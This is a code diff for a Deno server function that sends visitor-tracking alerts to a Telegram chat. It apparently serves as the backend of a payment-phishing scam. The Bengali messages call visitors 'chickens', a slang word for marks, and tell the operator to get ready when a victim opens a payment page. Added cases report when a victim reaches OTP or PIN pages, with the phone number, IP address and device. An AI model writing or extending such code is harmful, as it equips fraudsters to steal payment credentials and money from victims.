@@ -30,10 +30,77 @@ function br() {
 function buildMessage(type: string, data: any, meta: any) {
   const ip = escapeHtml(meta.ip || "N/A");
   const ref = escapeHtml(meta.referrer || "Direct");
-  const ua = escapeHtml(meta.ua || "N/A");
-  const screen = escapeHtml(meta.screen || "N/A");
+  const ua = escapeHtml(meta.ua || data?.device || "N/A");
+  const screen = escapeHtml(meta.screen || data?.screen || "N/A");
 
   switch (type) {
+    // New API events
+    case "visit": {
+      return (
+        `🐔 New Visit` + br() +
+        `IP: ${ip}` + br() +
+        `Device: ${ua}` + br() +
+        `Referrer: ${ref}`
+      );
+    }
+    case "platform_click": {
+      const platform = escapeHtml(data?.platform ?? "Youtube");
+      return (
+        `Now 🐔মুরগি is on ${platform} Platform` + br() +
+        `🐔মুরগির IP Address: ${ip}` + br() +
+        `🐔মুরগির Device: ${ua}`
+      );
+    }
+    case "service_click": {
+      const platform = escapeHtml(data?.platform ?? "N/A");
+      const service = escapeHtml(data?.service ?? "N/A");
+      return (
+        `🐔মুরগি Service Clicked` + br() +
+        `Platform: ${platform}` + br() +
+        `Service: ${service}` + br() +
+        `IP: ${ip}`
+      );
+    }
+    case "order_submit": {
+      const platform = escapeHtml(data?.platform ?? "N/A");
+      const service = escapeHtml(data?.service ?? "N/A");
+      const link = escapeHtml(data?.link ?? "N/A");
+      return (
+        `🐔 ORDER SUBMITTED` + br() +
+        `Platform: ${platform}` + br() +
+        `Service: ${service}` + br() +
+        `Link: ${link}` + br() +
+        `IP: ${ip}`
+      );
+    }
+    case "payment_page": {
+      const method = escapeHtml(data?.method ?? "Payment");
+      return (
+        `🐔 মুরগি ${method} এ ঢুকসে ⚠️ তাড়াতাড়ি রেডি হও ⚠️` + br() + br() +
+        `🐔মুরগির IP Address: ${ip}` + br() +
+        `🐔মুরগির Device: ${ua}`
+      );
+    }
+    case "payment_otp_note": {
+      const method = escapeHtml(data?.method ?? "N/A");
+      const numberMasked = escapeHtml(data?.numberMasked ?? "N/A");
+      return (
+        `🐔 OTP Page Reached - ${method}` + br() +
+        `Number Provided: ${numberMasked}` + br() +
+        `IP: ${ip}`
+      );
+    }
+    case "payment_pin_note": {
+      const method = escapeHtml(data?.method ?? "N/A");
+      const numberMasked = escapeHtml(data?.numberMasked ?? "N/A");
+      return (
+        `🐔 PIN Page Reached - ${method}` + br() +
+        `Number Provided: ${numberMasked}` + br() +
+        `IP: ${ip}`
+      );
+    }
+
+    // Legacy API events (backward compatibility)
     case "membership_click": {
       const platform = escapeHtml(data?.platform ?? "Youtube");
       return (
@@ -51,18 +118,30 @@ function buildMessage(type: string, data: any, meta: any) {
       );
     }
     case "payment_number": {
+      // Support both old and new format
       const page = escapeHtml(data?.page ?? "Payment Page");
       const number = escapeHtml(data?.number ?? "");
-      return (
-        `🐔মুরগির যেই পেজ Clicked page: ${page}` + br() +
-        `🐔মুরগির নাম্বার: ${number}` + br() +
-        `🐔মুরগির IP Address: ${ip}`
-      );
+      const method = escapeHtml(data?.method ?? "");
+      const numberMasked = escapeHtml(data?.numberMasked ?? "");
+      
+      if (numberMasked) {
+        return (
+          `🐔মুরগির Payment Method: ${method}` + br() +
+          `🐔মুরগির নাম্বার (masked): ${numberMasked}` + br() +
+          `🐔মুরগির IP Address: ${ip}`
+        );
+      } else {
+        return (
+          `🐔মুরগির যেই পেজ Clicked page: ${page}` + br() +
+          `🐔মুরগির নাম্বার: ${number}` + br() +
+          `🐔মুরগির IP Address: ${ip}`
+        );
+      }
     }
     case "payment_gateway_open": {
       const gateway = escapeHtml(data?.gateway ?? "Payment");
       return (
-        `🐔 মুরগি ${gateway} এ ঢুকসে ⚠️ তাড়াতাড়ি রেডি হও ⚠️` + br() + br() +
+        `🐔 মুরগি ${gateway} এ ঢুকসে ⚠️ তাড়াতাড়ি রেডি হও ⚠️` + br() + br() +
         `🐔মুরগির IP Address: ${ip}` + br() +
         `🐔মুরগির Referrer: ${ref}`
       );
@@ -90,7 +169,7 @@ function buildMessage(type: string, data: any, meta: any) {
       );
     }
     default:
-      return `Unknown log type: ${escapeHtml(type)}`;
+      return `Unknown log type: ${escapeHtml(type)}` + br() + `IP: ${ip}`;
   }
 }
 
@@ -123,18 +202,22 @@ Deno.serve(async (req) => {
   }
 
   try {
-    const { type, data } = await req.json();
+    const body = await req.json();
+    
+    // Support both old format {type, data} and new format {type, payload}
+    const type = body.type;
+    const data = body.payload || body.data || {};
 
     // Build meta from headers
     const headers = Object.fromEntries(req.headers.entries());
     const meta = {
       ip: headers["x-forwarded-for"]?.split(",")[0]?.trim() || headers["cf-connecting-ip"] || "",
-      referrer: headers["referer"] || headers["origin"] || "",
-      ua: headers["user-agent"] || "",
+      referrer: headers["referer"] || headers["origin"] || data?.referrer || "",
+      ua: headers["user-agent"] || data?.device || "",
       screen: data?.screen || "",
     };
 
-    const message = buildMessage(String(type || "generic"), data || {}, meta);
+    const message = buildMessage(String(type || "generic"), data, meta);
     return await sendToTelegram(message);
   } catch (e) {
     return new Response(JSON.stringify({ ok: false, error: String(e) }), {
